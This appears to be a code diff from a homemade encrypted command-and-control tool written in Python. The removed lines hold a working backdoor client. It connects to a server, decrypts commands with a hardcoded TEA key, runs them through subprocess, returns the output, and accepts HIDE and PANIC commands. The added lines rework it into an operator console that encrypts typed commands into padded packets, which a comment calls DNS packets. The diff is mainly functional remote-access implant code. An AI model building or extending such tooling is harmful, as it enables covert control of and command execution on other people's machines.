@@ -4,67 +4,164 @@ def runClient():
     HOST = "localhost" #"192.168.1.8"
     PORT = 1337 #52
     PKT_SIZE = 1024
-    KEY = "zMWYCRLd4szoBiPP"
 
     s = socket.socket()  # instantiate
     s.connect((HOST, PORT))  # connect to the server
 
-    return_msg = "connected"  # take input
-    while return_msg.lower().strip() != 'bye':
-        s.send(return_msg.encode())  # send message
-        data = s.recv(1024).decode()  # receive response
+    #user_input = "connected"  # initial input (**change to a proper packet saying connected**)
+    while True:
+        
+        ##grab user input
+        user_input = input('> ')
 
-        #unpack message from data into recv_msg
-        recv_msg = data
+        ##check for 'exit' command
+        if (user_input.strip() == 'exit'):
+            break
 
-        print('Received from server: ' + recv_msg)  # show in terminal
-
-        dec_recv_msg = ""
-        try:
-            dec_recv_msg = decrypt(recv_msg,KEY)
-        except Exception as e:
-            print('Error decrypting... ignoring packet')
-            return_msg = "decryption error"
+        ##pack the user input
+        packet, err = packInput(user_input)
+        #handle errors
+        if (err == 1):
+            #user_input length error
+            print("user input length error")
             continue
-        finally:
-            pass
+        elif (err == 2):
+            #encryption error
+            print("user input encryption error")
+            continue
+        elif (err == 3):
+            #decryption error
+            print("user input decryption error")
+            continue
+        elif (err == 4):
+            #packet crafting error
+            print("user input packet crafting error")
+            continue
 
-        #extract the command
-        cmd = dec_recv_msg.strip().split(" ",1)
-        print(cmd)
+        ##send the packet
+        s.send(packet.encode())
 
-        #handle special commands
-        if (cmd[0] == "HIDE"):
-        	#Execute a hide
-        	exit(0)
-        elif (cmd[0] == "PANIC"):
-        	#clean up
-        	exit(0)
+        ##receive the server's response
+        recv_data = s.recv(PKT_SIZE).decode()
 
-        cmd_output = ""
-        #try to execute the command
-        try:
-        	rawout = subprocess.run(cmd, capture_output=True)
-        except Exception as e:
-        	print('Error executing command... ignoring')
-        	return_msg = "command failed"
-        	continue
-        else:
-        	cmd_output = "EXECUTED COMMAND\n" + str(rawout.stdout,'utf-8')
-        	pass
-        finally:
-        	pass
+        ##unpack message from data into recv_msg
+        recv_msg, err = unpackData(recv_data)
+        #handle errors
+        if (err == 1):
+            #unpacking error
+            print("recv data unpacking error")
+            continue
+        elif (err == 2):
+            #decryption error
+            print("recv data decryption error")
+            continue
 
-        #send back output
-        return_msg = cmd_output
+        ##print the return message 
+        print('Received from server: ' + recv_msg)
 
     s.shutdown(socket.SHUT_RD)
     s.close()  # close the connection
 
+######################
+#  Helper functions  #
+######################
 
-###
-#TEA implementation: https://gist.github.com/twheys/4e83567942172f8ba85058fae6bfeef5
-###
+#def packInput(user_input)
+#args: user_input - user provided command string
+#returns: (packet, err) - DNS packet and error message
+#    err = 0 ; no error
+#        = 1 ; user_input length error
+#        = 2 ; encryption error
+#        = 3 ; decryption error
+#        = 4 ; packet crafting error
+def packInput(user_input):
+    TEA_KEY = "zMWYCRLd4szoBiPP"
+    packet = None
+    err = 0
+
+    ##user input sanitation
+    safe_input = processInput(user_input)
+    if(safe_input == None):
+        err = 1
+        return packet, err
+    
+    ##encryption
+    encrypted_safe_input = ""
+    try:
+        encrypted_safe_input = encrypt(safe_input, TEA_KEY)
+    except Exception as e:
+        err = 2
+        return packet, err
+    finally:
+        pass
+    
+    ##decryption test
+    try:
+        decrypt(encrypted_safe_input, TEA_KEY)
+    except Exception as e:
+        err = 2
+        return packet, err
+    finally:
+        pass
+
+    ##craft packet
+    packet = encrypted_safe_input
+
+    #return packet
+    return packet, err
+
+#def unpackData(recv_data)
+#args: recv_data - packet recieved from server
+#returns: (recv_msg, err) - extracted plaintext message and error message
+#    err = 0 ; no error
+#        = 1 ; unpacking error
+#        = 2 ; decryption error
+def unpackData(recv_data):
+    TEA_KEY = "zMWYCRLd4szoBiPP"
+    recv_msg = None
+    err = 0
+
+    ##extract message packet
+    encrypted_recv_msg = recv_data
+
+    ##decrypt message
+    try:
+        recv_msg = decrypt(encrypted_recv_msg, TEA_KEY)
+    except Exception as e:
+        err = 2
+        return recv_msg, err
+    finally:
+        pass
+
+    ##strip white space sanitation
+    recv_msg = recv_msg.strip()    
+
+    ##return message
+    return recv_msg, err
+
+#def processInput(user_input)
+#args: user_input - raw input captured from cli
+#returns: None if user_input is too long (>512 bytes)
+#otherwise, user_input padded to a certain length with whitespace. 
+def processInput(user_input):
+    len_input = len(user_input)
+    if(len_input <= 64):
+        return (user_input + ' ' * (64 - len(user_input)))
+    elif(len_input <= 128):
+        return (user_input + ' ' * (128 - len(user_input)))
+    elif(len_input <= 256):
+        return (user_input + ' ' * (256 - len(user_input)))
+    elif(len_input <= 512):
+        return (user_input + ' ' * (512 - len(user_input)))
+    else:
+        #command was too large
+        return None
+    return None
+
+
+#######################################################################################
+# TEA implementation: https://gist.github.com/twheys/4e83567942172f8ba85058fae6bfeef5 #
+#######################################################################################
 def encrypt(plaintext, key):
     if not plaintext:
         return ''
